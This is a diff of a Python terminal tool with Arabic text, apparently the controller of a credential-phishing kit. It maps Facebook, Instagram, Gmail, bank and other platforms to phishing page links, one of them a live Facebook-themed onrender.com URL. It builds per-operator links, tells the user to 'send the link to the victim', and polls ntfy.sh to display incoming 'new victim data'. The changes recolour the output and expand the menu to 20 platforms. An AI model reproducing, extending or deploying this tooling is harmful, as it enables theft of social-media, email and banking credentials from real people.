@@ -9,52 +9,53 @@ import threading
 import time
 import sys
 
-# ========== الألوان ==========
-BLUE = '\033[94m'
-SILVER = '\033[90m'
-GREEN = '\033[92m'
-CYAN = '\033[96m'
+# ========== الألوان الجديدة ==========
+ORANGE = '\033[93m'   # برتقالي للبانر
+RED = '\033[91m'      # أحمر للباقي
 BOLD = '\033[1m'
 RESET = '\033[0m'
-# ============================
+# ====================================
 
 CONFIG_FILE = "g110_config.json"
 
+# الروابط للمنصات (املأ الروابط الفعلية عند توفرها)
 LINKS = {
-    1: "https://facebook-vjj9.onrender.com",
-    2: "",
-    3: "",
-    4: "",
-    5: "",
-    6: "",
-    7: "",
-    8: "",
-    9: "",
-    10: ""
+    1: "https://facebook-vjj9.onrender.com",  # فيسبوك مفعل
+    2: "",   # انستغرام
+    3: "",   # تويتر
+    4: "",   # سناب شات
+    5: "",   # تيك توك
+    6: "",   # جيميل
+    7: "",   # ياهو
+    8: "",   # Outlook
+    9: "",   # بنك
+    10: "",  # منصة مخصصة 10
+    11: "",  # منصة 11
+    12: "",  # منصة 12
+    13: "",  # منصة 13
+    14: "",  # منصة 14
+    15: "",  # منصة 15
+    16: "",  # منصة 16
+    17: "",  # منصة 17
+    18: "",  # منصة 18
+    19: "",  # منصة 19
+    20: ""   # منصة 20
 }
 
 PLATFORMS = {
-    1: "فيسبوك",
-    2: "انستغرام",
-    3: "تويتر",
-    4: "سناب شات",
-    5: "تيك توك",
-    6: "جيميل",
-    7: "ياهو",
-    8: "Outlook",
-    9: "بنك",
-    10: "منصة مخصصة"
+    1: "فيسبوك", 2: "انستغرام", 3: "تويتر", 4: "سناب شات", 5: "تيك توك",
+    6: "جيميل", 7: "ياهو", 8: "Outlook", 9: "بنك", 10: "منصة 10",
+    11: "منصة 11", 12: "منصة 12", 13: "منصة 13", 14: "منصة 14", 15: "منصة 15",
+    16: "منصة 16", 17: "منصة 17", 18: "منصة 18", 19: "منصة 19", 20: "منصة 20"
 }
 
 def clear_screen():
-    """مسح الشاشة حسب نظام التشغيل"""
     if os.name == 'nt':
         os.system('cls')
     else:
         os.system('clear')
 
 def load_or_create_secret():
-    """تحميل المفتاح السري أو إنشاؤه"""
     if os.path.exists(CONFIG_FILE):
         with open(CONFIG_FILE, "r") as f:
             data = json.load(f)
@@ -65,8 +66,7 @@ def load_or_create_secret():
     return secret
 
 def print_banner():
-    """طباعة البانر الجديد باللون الأزرق والفضي"""
-    banner = f"""{BLUE}
+    banner = f"""{ORANGE}
   _____   __   __    ___  
  / ____| /_ | /_ |  / _ \\ 
 | |  __   | |  | | | | | |
@@ -83,24 +83,26 @@ def print_banner():
     print(banner)
 
 def print_menu():
-    """طباعة قائمة المنصات"""
-    print(SILVER + "═" * 30 + RESET)
-    print(BLUE + BOLD + "      قائمة المنصات" + RESET)
-    print(SILVER + "═" * 30 + RESET)
-    for n in sorted(PLATFORMS.keys()):
-        if LINKS.get(n, "") == "":
-            status = SILVER + "(غير مفعل)" + RESET
-        else:
-            status = GREEN + "(مفعل)" + RESET
-        print(f"{BLUE}{n}{RESET} - {CYAN}{PLATFORMS[n]}{RESET} {status}")
-    print(SILVER + "══" * 15 + RESET)
-    print(f"{BLUE}0{RESET} - {CYAN}خروج{RESET}")
+    print(RED + "═" * 46 + RESET)
+    print(RED + BOLD + "           قائمة المنصات (20)" + RESET)
+    print(RED + "═" * 46 + RESET)
+    # عرض عمودين: 1-10 في اليسار، 11-20 في اليمين
+    for i in range(1, 11):
+        left_num = i
+        right_num = i + 10
+        left_status = "(مفعل)" if LINKS.get(left_num) else "(غير مفعل)"
+        right_status = "(مفعل)" if LINKS.get(right_num) else "(غير مفعل)"
+        left_line = f"{RED}{left_num}{RESET} - {PLATFORMS[left_num]} {left_status}"
+        right_line = f"{RED}{right_num}{RESET} - {PLATFORMS[right_num]} {right_status}"
+        # المسافة بين العمودين
+        print(f"{left_line:<30}{right_line}")
+    print(RED + "═" * 46 + RESET)
+    print(f"{RED}0{RESET} - خروج")
 
 def display_victim_data(message):
-    """عرض بيانات الضحية بشكل منظم ومرتب"""
-    print("\n" + GREEN + "═" * 40 + RESET)
-    print(GREEN + BOLD + "  📩 بيانات ضحية جديدة" + RESET)
-    print(GREEN + "═" * 40 + RESET)
+    print("\n" + RED + "═" * 40 + RESET)
+    print(RED + BOLD + "  📩 بيانات ضحية جديدة" + RESET)
+    print(RED + "═" * 40 + RESET)
     lines = message.strip().split('\n')
     for idx, line in enumerate(lines):
         line = line.strip()
@@ -112,13 +114,12 @@ def display_victim_data(message):
             key, val = line.split(':', 1)
             key = key.strip()
             val = val.strip()
-            print(f"{BLUE}{BOLD}{key}{RESET}: {val}")
+            print(f"{RED}{BOLD}{key}{RESET}: {val}")
         else:
-            print(line)
-    print(GREEN + "═" * 40 + RESET + "\n")
+            print(f"{RED}{line}{RESET}")
+    print(RED + "═" * 40 + RESET + "\n")
 
 def listen_ntfy(topic):
-    """الاستماع لرسائل ntfy.sh وعرضها منسقة"""
     url = f"https://ntfy.sh/{topic}/json"
     while True:
         try:
@@ -139,16 +140,16 @@ def main():
     secret = load_or_create_secret()
     clear_screen()
     print_banner()
-    print(f"{BLUE}🔑 مفتاحك السري: {CYAN}{secret}{RESET}\n")
+    print(f"{RED}🔑 مفتاحك السري: {secret}{RESET}\n")
     threading.Thread(target=listen_ntfy, args=(secret,), daemon=True).start()
     time.sleep(1)
 
     while True:
         print_menu()
-        choice = input(f"{BLUE}> {RESET}").strip()
+        choice = input(f"{RED}> {RESET}").strip()
 
         if choice == "0":
-            print(f"{GREEN}إيقاف الأداة...{RESET}")
+            print(f"{RED}إيقاف الأداة...{RESET}")
             sys.exit(0)
 
         if choice.isdigit():
@@ -157,34 +158,34 @@ def main():
                 if LINKS[num] == "":
                     clear_screen()
                     print_banner()
-                    print(f"{SILVER}❌ منصة {PLATFORMS[num]} غير مفعلة بعد.{RESET}")
-                    input(f"{BLUE}اضغط Enter للرجوع...{RESET}")
+                    print(f"{RED}❌ منصة {PLATFORMS[num]} غير مفعلة بعد.{RESET}")
+                    input(f"{RED}اضغط Enter للرجوع...{RESET}")
                     clear_screen()
                     print_banner()
                 else:
                     link = LINKS[num] + "?topic=" + secret
                     clear_screen()
                     print_banner()
-                    print(f"{SILVER}{'═' * 40}{RESET}")
-                    print(f"{GREEN}✅ رابط {PLATFORMS[num]}:{RESET}")
-                    print(f"{BLUE}{BOLD}{link}{RESET}")
-                    print(f"{SILVER}{'═' * 40}{RESET}")
-                    print(f"{CYAN}انسخ الرابط وأرسله للضحية.{RESET}")
-                    input(f"{BLUE}اضغط Enter للرجوع...{RESET}")
+                    print(f"{RED}{'═' * 40}{RESET}")
+                    print(f"{RED}✅ رابط {PLATFORMS[num]}:{RESET}")
+                    print(f"{RED}{BOLD}{link}{RESET}")
+                    print(f"{RED}{'═' * 40}{RESET}")
+                    print(f"{RED}انسخ الرابط وأرسله للضحية.{RESET}")
+                    input(f"{RED}اضغط Enter للرجوع...{RESET}")
                     clear_screen()
                     print_banner()
             else:
                 clear_screen()
                 print_banner()
-                print(f"{SILVER}رقم غير صحيح{RESET}")
-                input(f"{BLUE}اضغط Enter للرجوع...{RESET}")
+                print(f"{RED}رقم غير صحيح{RESET}")
+                input(f"{RED}اضغط Enter للرجوع...{RESET}")
                 clear_screen()
                 print_banner()
         else:
             clear_screen()
             print_banner()
-            print(f"{SILVER}اختيار غير مفهوم{RESET}")
-            input(f"{BLUE}اضغط Enter للرجوع...{RESET}")
+            print(f"{RED}اختيار غير مفهوم{RESET}")
+            input(f"{RED}اضغط Enter للرجوع...{RESET}")
             clear_screen()
             print_banner()
 
